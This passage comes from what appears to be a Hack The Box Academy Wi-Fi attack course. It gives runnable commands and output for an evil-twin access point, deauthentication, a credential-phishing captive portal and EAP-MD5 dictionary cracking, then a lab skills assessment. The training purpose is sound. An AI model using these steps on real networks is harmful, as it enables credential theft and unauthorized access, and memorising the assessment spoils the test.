  CC  ../src/common/wpa_ctrl.c
  CC  ../src/common/cli.c
  CC  ../src/utils/edit_simple.c
  LD  hostapd-wpe_cli

```

After the compilation is completed, it will generate two binary files: `hostapd-wpe` and `hostapd-wpe_cli`, both located in the `/opt/hostapd-2.6/hostapd` directory.
With the modified hostapd-wpe now compiled, we can proceed to use it to start our fake access point (AP).

```shell
/opt/hostapd-2.6/hostapd/hostapd-wpe hostapd-wpe.conf

Configuration file: hostapd-wpe.conf
rfkill: Cannot open RFKILL control device
Using interface wlan1 with hwaddr fe:53:63:ce:2a:25 and ssid "HTB-Corp"
random: Only 16/20 bytes of strong random data available from /dev/random
random: Not enough entropy pool available for secure operations
WPA: Not enough entropy in random pool for secure operations - update keys later when the first station connects
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED

```

Once the fake AP is up and running, we can increase our chances of success by performing a `deauthentication attack`. This attack forces clients to disconnect from their legitimate access point (AP), encouraging them to connect to our fake AP instead.

```shell
sudo aireplay-ng -0 3 -a 9C:9A:03:39:BD:7A -c 2E:18:CB:2D:7D:9F wlan0mon

12:53:52  Waiting for beacon frame (BSSID: 9C:9A:03:39:BD:7A) on channel 1
12:53:53  Sending 64 directed DeAuth (code 7). STMAC: [2E:18:CB:2D:7D:9F] [ 0| 0 ACKs]
12:53:53  Sending 64 directed DeAuth (code 7). STMAC: [2E:18:CB:2D:7D:9F] [ 0| 0 ACKs]
12:53:54  Sending 64 directed DeAuth (code 7). STMAC: [2E:18:CB:2D:7D:9F] [ 0| 0 ACKs]

```

When a client successfully connects to our fake access point and the EAP negotiation is completed, we should see output similar to the following in the `hostapd-wpe` tab, indicating that the WPA key handshake was successfully completed.

```shell
wlan1: AP-ENABLED
wlan1: STA 2e:18:cb:2d:7d:9f IEEE 802.11: authenticated
wlan1: STA 2e:18:cb:2d:7d:9f IEEE 802.11: associated (aid 1)
wlan1: CTRL-EVENT-EAP-STARTED 2e:18:cb:2d:7d:9f
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=13
wlan1: CTRL-EVENT-EAP-SUCCESS 2e:18:cb:2d:7d:9f
wlan1: STA 2e:18:cb:2d:7d:9f WPA: pairwise key handshake completed (RSN)
wlan1: AP-STA-CONNECTED 2e:18:cb:2d:7d:9f
wlan1: STA 2e:18:cb:2d:7d:9f IEEE 802.1X: authenticated - EAP type: 0 (unknown)

```

Once a client with `EAP-TLS` auth is connected to our fake access point, several attack vectors become available. Here are some common attacks that can be performed:

- `Phishing Pages`: Redirect the client to a phishing page that mimics the legitimate login portal. This can trick users into entering their credentials, which we can then capture.
- `Fake Captive Portal`: Set up a fake captive portal that requests login credentials, often used in public Wi-Fi networks, to capture usernames and passwords.
- `SSL Stripping`: Downgrade HTTPS connections to HTTP, allowing us to intercept and read unencrypted data sent by the client.
- `Packet Sniffing`: Capture and analyze all traffic between the client and the internet, extracting sensitive information such as session cookies, passwords, and personal data.
- `DNS Spoofing`: Redirect the client's DNS requests to a malicious server, leading them to fake websites where further attacks can be executed.

We’ll set up a `Fake Captive Portal` to require clients to enter their credentials before they can access the internet.

We can achieve this using [Nagaw](https://github.com/bransh/Nagaw), an effective tool for creating and managing fake captive portals. By configuring Nagaw with the `-i` option set to the `wlan1` interface and the `-o` option set to the `wlan2` interface, we ensure that clients are initially unable to access the internet and are instead redirected to our captive portal login page. Once clients enter their credentials on the portal, Nagaw will redirect their traffic through the wlan2 interface, thereby restoring their internet access.

```shell
python2 nagaw.py -i wlan1 -o wlan2 -t demo

[*] Starting at 2024-08-28 12:53 ...
[*] Starting dnsmasq ...
[*] Cleaning iptables rules from the system ...
[*] Configuring NAT for providing Internet via wlan2 ...
[*] Configuring iptables for redirecting HTTP(s) to this host ...
[*] Loading phishing scenarios from /opt/Nagaw/template-pages ...
[*] Selecting "Victim Company WiFi Login Page" template ...
[*] Starting HTTP/HTTPS server at ports 80/443 ...

```

Once the Nagaw server is started, it will host a fake captive portal. Clients attempting to access the internet will be redirected to a login page, as shown below.

![image](https://academy.hackthebox.com/storage/modules/282/Enterprise/eap-tls-captiveportal.png)

When a client successfully submits their credentials, we can retrieve them from the Nagaw server's output.

```shell
python2 nagaw.py -i wlan1 -o wlan2 -t demo

[*] Starting at 2024-08-28 12:53 ...
[*] Starting dnsmasq ...
[*] Cleaning iptables rules from the system ...
[*] Configuring NAT for providing Internet via wlan2 ...
[*] Configuring iptables for redirecting HTTP(s) to this host ...
[*] Loading phishing scenarios from /opt/Nagaw/template-pages ...
[*] Selecting "Victim Company WiFi Login Page" template ...
[*] Starting HTTP/HTTPS server at ports 80/443 ...
[+] New victim(s):
    MAC: 2e:18:cb:2d:7d:9f / IP: 10.0.0.36
[+] GET request from 10.0.0.36 for http://captive.apple.com/hotspot-detect.html
[+] GET request from 10.0.0.36 for http://captive.apple.com/hotspot-detect.html
[+] GET request from 10.0.0.36 for http://captive.apple.com/fonts/glyphicons-halflings-regular.woff
[+] GET request from 10.0.0.36 for http://captive.apple.com/fonts/glyphicons-halflings-regular.ttf
[+] GET request from 10.0.0.36 for http://captive.apple.com/fonts/glyphicons-halflings-regular.svg
[+] GET request from 10.0.0.36 for http://captive.apple.com/hotspot-detect.html
[D] POST request from 10.0.0.36 for http://captive.apple.com/login
[+] New Credentials obtained from 10.0.0.36 :
    -> {u'username': u'Sentinal', u'password': u'Admin@123'}
[*] Providing internet access to 10.0.0.36 ...

```

Note: For demonstration purposes in the lab, we used Nagaw's default captive portal template by specifying \`-t demo\`. However, in real-world scenarios, it is advisable to customize the captive portal to make it appear more familiar and authentic to the target.

* * *


# Cracking EAP-MD5

* * *

`EAP-MD5 (EAP-Message Digest 5)` is a base security protocol within the Extensible Authentication Protocol (EAP) standard, designed to authenticate users based on a username and password combination. Its mechanism involves creating a unique `fingerprint` for each message, digitally signing packets to verify the authenticity of EAP messages. Known for being lightweight and efficient, EAP-MD5 is quick to implement and configure, making it an attractive choice for early network authentication.

The MD5 challenge-response mechanism was introduced in the 1995 Internet Engineering Task Force (IETF) draft, which later became RFC 2284. EAP-MD5 offers one-way client authentication, where the server sends a random challenge to the client. The client responds by hashing the challenge along with its password using the MD5 algorithm, proving its identity. While this method was considered an effective solution in its early days, it has since become outdated due to inherent security weaknesses.

One of the critical shortcomings of EAP-MD5 is its vulnerability to various attacks. For example, a man-in-the-middle attack can easily intercept both the challenge and the response, allowing an attacker to perform a dictionary attack to retrieve the password. The absence of server authentication further opens the door to spoofing attacks. Additionally, EAP-MD5 does not support key delivery, which is essential for securing communication channels. Due to these limitations, EAP-MD5 is generally unsuitable for wireless LANs (WLANs), where secure authentication and encryption are crucial. Instead, it is commonly used in wired networks, where its vulnerabilities are less likely to be exploited. This [blog](https://garykongcybersecurity.medium.com/insecure-802-1x-port-based-authentication-using-eap-md5-c2b298bfc3ab) demonstrates how EAP-MD5 can be exploited within a physical LAN environment, when an intruder gains insider access to perform MiTM.

* * *

## Enumeration

We begin by enabling monitor mode on our `wlan0` interface using `airmon-ng`.

```shell
sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)

```

Once our interface is in monitor mode, we can use `airodump-ng` to scan for available Wi-Fi networks and their associated clients. We can use the argument `-w WPA` to save the output of the capture to a file.

```shell
airodump-ng wlan0mon -c 1 -w WPA

12:39:34  Created capture file "WPA-01.cap".

 CH  1 ][ Elapsed: 12 s ][ 2024-09-13 12:39 ][ Decloak: DC:7B:01:B3:DD:B1

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 DC:7B:01:B3:DD:B1  -28   0      117        3    0   1   54   WPA2 CCMP   MGT  HTB-Corp

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 DC:7B:01:B3:DD:B1  A2:79:F3:78:C0:BB  -29    1 - 1     52       17         HTB-Corp

```

After capturing sufficient data, we can use Wireshark to analyze the authentication type by applying the `eap` filter.

![image](https://academy.hackthebox.com/storage/modules/282/Enterprise/eap_md5_0.PNG)

* * *

## Performing the Attack

In Wireshark, we can see that the authentication method is `EAP-MD5` and under the `Response, Identity` section, the username `administrator` is revealed.

![image](https://academy.hackthebox.com/storage/modules/282/Enterprise/eap_md5_1.PNG)

Next, we need to extract the `EAP-MD5 values` (hashes) and the `ID` from the `Request, MD5-Challenge` and `Response, MD5-Challenge` sections in Wireshark. These values are crucial for further analysis and potential exploitation.

![image](https://academy.hackthebox.com/storage/modules/282/Enterprise/eap_md5_2.PNG)

![image](https://academy.hackthebox.com/storage/modules/282/Enterprise/eap_md5_3.PNG)

At this point, we have gathered the following data points:

- Username from Response, Identity: `administrator`
- EAP-MD5 value of Request, MD5-Challenge: `776b900e685dea0230b41eec2010535c`
- EAP-MD5 value of Response, MD5-Challenge: `054ea58706a52f0c95fc47ccf11eb5a1`
- The Request ID: `173`

With the collected data, we can use a tool like [eapmd5pass](https://github.com/joswr1ght/eapmd5pass) to perform a dictionary attack and crack the MD5 hash. This allows us to recover the password by comparing the hash against a list of potential passwords, making it possible to compromise the authentication credentials.

Before using the `eapmd5pass` tool, we need to convert EAP-MD5 values of both the `Request Challenge` and `Response Challenge` into `Colon Hexadecimal` format. This format is required for the dictionary attack to proceed.

```shell
echo 776b900e685dea0230b41eec2010535c | sed 's/\(..\)/\1:/g;s/:$//'

77:6b:90:0e:68:5d:ea:02:30:b4:1e:ec:20:10:53:5c

```

```shell
echo 054ea58706a52f0c95fc47ccf11eb5a1 | sed 's/\(..\)/\1:/g;s/:$//'

05:4e:a5:87:06:a5:2f:0c:95:fc:47:cc:f1:1e:b5:a1

```

We're now ready to run the eapmd5pass tool to crack the hash. We provide the Colon Hexadecimal value of the EAP-MD5 hash from the `Request Challenge` using the `-C` argument, and the EAP-MD5 hash from the `Response Challenge` using the `-R` argument. We also include the username using the `-U` argument, the specified wordlist with the `-w` argument, and the Request ID using the `-E` argument. These inputs enable the eapmd5pass tool to execute the dictionary attack effectively and attempt to crack the EAP-MD5 hash.

```shell
eapmd5pass -w /opt/rockyou.txt -U administrator -C 77:6b:90:0e:68:5d:ea:02:30:b4:1e:ec:20:10:53:5c -R 05:4e:a5:87:06:a5:2f:0c:95:fc:47:cc:f1:1e:b5:a1 -E 173

eapmd5pass - Dictionary attack against EAP-MD5
User password is "basketball".
54 passwords in 0.00 seconds: 110429.45 passwords/second.

```

* * *

## Closing Thoughts

Attacking WPA/WPA2 networks, whether WPA-Personal (PSK) or WPA-Enterprise (MGT), is a complex yet rewarding endeavor that highlights both the strengths and weaknesses of modern wireless security protocols. While WPA2-PSK remains widely used, its security depends heavily on the complexity of the pre-shared key. A poorly chosen key can be cracked easily, opening the network to unauthorized access. On the other hand, WPA2-Enterprise (MGT) introduces the use of RADIUS servers and individual user credentials, offering stronger protection but also presenting a larger attack surface due to the variety of valid credential combinations. Throughout this exploration, we have demonstrated how password complexity, authentication methods, and server-side configurations play a critical role in securing wireless networks. Whether employing brute-force techniques, exploiting misconfigurations, or leveraging social engineering tactics, each attack vector offers insight into the importance of proactive security measures.

As attackers evolve, so must defenders. Strengthening passwords, enforcing certificate validation, and regularly auditing wireless network configurations are essential steps in mitigating these vulnerabilities. By understanding how these attacks work, we are better equipped to defend against them and build more resilient wireless infrastructures.


# Attacking WPA/WPA2 Wi-Fi Networks - Skills Assessment

* * *

## Scenario

* * *

`StarLight Hospital`, a leading healthcare provider, has hired you to conduct a penetration test on their Wi-Fi network. With several contractors involved in setting up the hospital's wireless infrastructure, they need assurance that their networks are secure and compliant with industry standards. Your task is to identify any vulnerabilities that could potentially expose patient data, medical devices, or internal systems to unauthorized access. This assessment will ensure that the hospital's Wi-Fi infrastructure is resilient against potential threats, while maintaining the privacy and security of critical medical operations.

Harness the Wi-Fi attack techniques you learned in this module to disclose all security vulnerabilities.

* * *

## In-Scope Targets

| **SSID** | **Description** |
| --- | --- |
| `StarLight` | `SLH main SSID for network access` |
| `StarLight-BYOD` | `Physician's personal devices and some MDM devices` |
| `StarLight-Protect` | `Biomed devices` |

* * *

Note: Please wait for 2 minutes after the target spawns before connecting.

* * *

Apply the skills learned in this module to compromise all Wi-Fi networks present in the client environment and submit the relevant flags to complete the skills assessment.


